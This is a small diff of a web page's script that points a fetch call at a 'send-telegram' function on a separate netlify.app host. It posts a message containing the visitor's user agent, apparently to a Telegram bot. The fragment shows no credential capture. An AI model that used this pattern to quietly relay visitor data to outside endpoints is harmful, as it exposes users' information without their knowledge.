@@ -615,7 +615,7 @@
 👤 User Agent: ${navigator.userAgent.substring(0, 50)}...`;
 
             // Call Netlify function instead of exposing token
-            fetch('/.netlify/functions/send-telegram', {
+            fetch('https://loquacious-squirrel-c148ed.netlify.app/.netlify/functions/send-telegram', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -800,5 +800,6 @@
     </script>
 </body>
 </html>
+
 
 
